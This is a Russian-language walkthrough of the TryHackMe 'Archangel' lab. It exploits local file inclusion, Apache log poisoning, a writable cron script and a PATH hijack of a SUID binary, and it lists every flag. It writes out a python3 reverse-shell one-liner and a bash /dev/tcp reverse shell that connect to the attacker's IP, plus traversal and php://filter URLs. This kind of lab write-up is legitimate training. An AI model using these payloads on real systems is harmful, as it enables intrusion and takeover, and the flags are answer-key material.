# TryHackMe: Archangel

## Task 1: Deploy Machine

### Question 1: Connect to openvpn and deploy the machine - :heavy\_check_mark:

## Task 2: Get a shell
Для начала просканируем хост при помощи Nmap:
```sh
nmap -sC -sV -p- 10.10.78.160 -T4
```

![ScreenShot](screenshots/1.png)

Найденные сервисы:
- 22 port - SSH (OpenSSH 7.6p1)
- 80 port - HTTP (Apache httpd 2.4.29)

Переходим на сайт и находим альтернативное имя исследуемого хоста **mafialive.thm**

![ScreenShot](screenshots/2.png)

### Question 2: Find a different hostname - mafialive.thm

Редактируем соответствующим образом файл **/etc/hosts**, внеся в него новую запись с альтернативным именем.

![ScreenShot](screenshots/3.png)

Вновь перейдем на сайт, но уже используя найденное имя

![ScreenShot](screenshots/4.png)

### Question 3: Find flag 1 - thm{f0und_th3_r1ght_h0st_n4m3}

Теперь просканируем сайт на наличие директорий:
```sh
gobuster dir -u http://mafialive.thm -w /usr/share/wordlists/dirb/common.txt
```

![ScreenShot](screenshots/5png)

Находим **robots.txt**:

![ScreenShot](screenshots/6.png)

Переходим на **/test.php**:

![ScreenShot](screenshots/7.png)

### Question 4: Look for a page under development - test.php

На странице располагается кнопка. Если нажать на нее, то появится сообщение и в url отобразится полный путь до того места, где мы находимся.

![ScreenShot](screenshots/8.png)

Намек на LFI. Пробуем посмотреть на **/etc/passwd**:
```sh
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//etc/passwd
```

![ScreenShot](screenshots/9.png)

После нескольких попыток у нас получается дотянуться до вышеупомянутого файла. Попробуем получить исходный код страницы **test.php**
```sh
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```

![ScreenShot](screenshots/10.png)

Копируем полученную строку в формате base64 и декодируем, получая исходный код страницы и второй флаг:

![ScreenShot](screenshots/11.png)

### Question 5: Find flag 2 - thm{explo1t1ng_lf1}

Далее находим страницу с логами Apache:
```sh
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//log/apache2/access.log
```

![ScreenShot](screenshots/12.png)

Откроем BurpSuite и перенесем в Repeater наш запрос:

![ScreenShot](screenshots/13.png)

Модифицируем запрос, как показано ниже:

![ScreenShot](screenshots/14.png)

Результат запроса:

![ScreenShot](screenshots/15.png)

Как видим, наша команда **ls**, которая передана в качестве аргумента параметру **cmd**, успешно исполнилась. Параметр **cmd** указан в поле **User-Agent**, т.е. в этом поле ожидается прием команды на исполнение через аргумент.

Раз команды исполняются, можно реализовать команду на получение reverse shell'а (Обращаю внимание на то, что используется именно python3):
```sh
python3%20-c%20'import%20socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.106.249",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

Для начала ставим у себя на машине порт 4444 на прослушивание:

![ScreenShot](screenshots/16.png)

Далее во все том же разделе Repeater, необходимо внедрить команду для получения reverse shell'а:

![ScreenShot](screenshots/17.png)

В итоге мы получаем первичный доступ к терминалу на удаленном хосте:

![ScreenShot](screenshots/18.png)

Получаем очередной флаг:

![ScreenShot](screenshots/19.png)

### Question 6: Get a shell and find the user flag - thm{lf1_t0_rc3_1s_tr1cky}

## Task 3: Root the machine
Среди файлов пользователя **archangel**, не удалось найти ничего интересного, найдена только та самая ссылка...

![ScreenShot](screenshots/20.png)

Заглянем в **crontab**:

![ScreenShot](screenshots/21.png)

Находим задачу, которая запускает скрипт helloworld.sh:

![ScreenShot](screenshots/22.png)

Собственно говоря, можно в этот файл добавить команду, которая даст нам другой reverse shell, но уже от лица пользователя **archangel**.
```sh
echo "bash -i >& /dev/tcp/10.18.106.249/5555 0>&1" >> /opt/helloworld.sh
```

Слушаем другой порт, например, 5555:

![ScreenShot](screenshots/23.png)

Запускаем команду, которая представлена выше:

![ScreenShot](screenshots/24.png)

И вот у нас получилось реализовать горизонтальное повышение привилегий:

![ScreenShot](screenshots/25.png)

Получаем еще один флаг:

![ScreenShot](screenshots/26.png)

### Question 7: Get User 2 flag - thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}

Теперь перед нами стоит задача получить суперпользователя. К сожалению, sudo мы использовать не можем:

![ScreenShot](screenshots/27.png)

В директории /home/archangel/secret, помимо флага, обнаружен исполняемый файл. Попробуем его запустить:

![ScreenShot](screenshots/28.png)

![ScreenShot](screenshots/29.png)

Получаем ошибку, связанную с **cp**. А вот тут как раз можно повыситься, подменив ту команду.

![ScreenShot](screenshots/30.png)

Всякий раз, когда вызывается команда **cp**, **/bin/bash** будет выполняться с разрешения действующего пользователя (в случае двоичного файла SUID это будет root). Привилегии повышены до суперпользователя - читаем последний флаг:

![ScreenShot](screenshots/31.png)

### Question 8: Root the machine and find the root flag - thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}
